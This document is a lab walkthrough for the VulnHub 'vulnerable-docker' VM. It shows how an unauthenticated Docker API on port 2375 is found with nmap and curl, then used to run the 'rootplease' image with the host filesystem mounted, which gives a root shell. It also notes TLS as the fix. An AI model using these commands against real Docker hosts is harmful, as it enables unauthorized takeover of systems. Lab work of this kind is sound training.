# KBID 45 - Exposed docker daemon

## Exposed docker daemon over HTTP rest API

{% hint style="info" %}
First download the OVA to start on virtualbox [https://www.vulnhub.com/entry/vulnerable-docker-1,208/](https://www.vulnhub.com/entry/vulnerable-docker-1,208/)
{% endhint %}

> After downloading the image run it and start it in easy mode. After you have found the IP address of the machine than happy hacking!

By default, Docker runs through a non-networked UNIX socket. It can also optionally communicate using an HTTP socket, as is what we see with this vulnerable VM.

If you need Docker to be reachable through the network in a safe manner, you can enable TLS by specifying the tlsverify flag and pointing Docker’s tlscacert flag to a trusted CA certificate.

In the daemon mode, it only allows connections from clients authenticated by a certificate signed by that CA. In the client mode, it only connects to servers with a certificate signed by that CA.

However this is not the case for the following example, let's see if we can now gain control over the Docker host machine by exploiting this open Docker API.

**Recon**

A normal nmap scan does not find any interesting results:

```text
nmap -sT -sV <ip adress>

Nmap scan report for <ip adress>
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

However, when we start scanning the entire port range, here comes some interesting information:

```text
nmap -sT -sV -p- <ip adress>

Nmap scan report for <ip adress>
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  Docker 17.06.0-ce
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now that we have found the port on which the Docker API is listening let's see if we can get some interesting information from there? We can either do a curl to the following endpoint, or simply put the following GET request in the browser to see the results.

```text
curl http://<ip adress>:2375/images/json
```

we now find information about all the current running images:

```text
[{
    "Containers": -1,
    "Created": 1501805621,
    "Id": "sha256:c4260b289fc788fd3f66a2a1bb0e7697b62511861626a39c7d0676b8909afc20",
    "Labels": {},
    "ParentId": "",
    "RepoDigests": ["wordpress@sha256:632c5f09a3de6fa711b208126bcef405e844a13f7cb38a83b0045043f4b1266f"],
    "RepoTags": ["wordpress:latest"],
    "SharedSize": -1,
    "Size": 405873668,
    "VirtualSize": 405873668
}, {
    "Containers": -1,
    "Created": 1501052770,
    "Id": "sha256:c73c7527c03a13729a6bba88a3251c95629e8036c0ccf17dadefb4c5f077a315",
    "Labels": {},
    "ParentId": "",
    "RepoDigests": ["mysql@sha256:96edf37370df96d2a4ee1715cc5c7820a0ec6286551a927981ed50f0273d9b43"],
    "RepoTags": ["mysql:5.7"],
    "SharedSize": -1,
    "Size": 412365478,
    "VirtualSize": 412365478
}, {
    "Containers": -1,
    "Created": 1492156751,
    "Id": "sha256:7d3ecb48134e41ac56003879ae8b0faa7e8931b927a3af28af82504434b9c9c4",
    "Labels": {},
    "ParentId": "",
    "RepoDigests": ["jeroenpeeters/docker-ssh@sha256:a1c8cefef3e2a7242970ef841acfcb9ead47355bc87a9c5c25627659e1c0b2b9"],
    "RepoTags": ["jeroenpeeters/docker-ssh:latest"],
    "SharedSize": -1,
    "Size": 43209635,
    "VirtualSize": 43209635
}]
```

Now let's see if we can make it more interesting. First i want to make my Docker client communicate with the remote Daemon API I do this by running the following command:

```text
alias dockerx="docker -H=<ip adress>:2375"
```

alternatively we could also use the docker engine SDK as described here:

```text
https://docs.docker.com/develop/sdk/examples/#run-a-container
```

Now, we first test that the alias works, we do this by simply running the following command:

```text
dockerx ps

CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS                  NAMES
8f4bca8ef241        wordpress:latest           "docker-entrypoint.s…"   18 months ago       Up 2 hours          0.0.0.0:8000->80/tcp   content_wordpress_1
13f0a3bb2706        mysql:5.7                  "docker-entrypoint.s…"   18 months ago       Up 2 hours          3306/tcp               content_db_1
b90babce1037        jeroenpeeters/docker-ssh   "npm start"              18 months ago       Up 2 hours          22/tcp, 8022/tcp       content_ssh_1
```

#### exploitation

Now, we want to become root on the Docker host machine, we can achieve this by running a special container.

The command below is going to perform the privilege escalation and fetches a Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.

The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume. This effectively gives you root on the machine.

There are many, many other ways to achieve this, but this was one of the most straightforward.

```text
dockerx run -v /:/hostOS -i -t chrisfosterelli/rootplease
Unable to find image 'chrisfosterelli/rootplease:latest' locally
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Congratulations, we now are root on the Docker host machine!

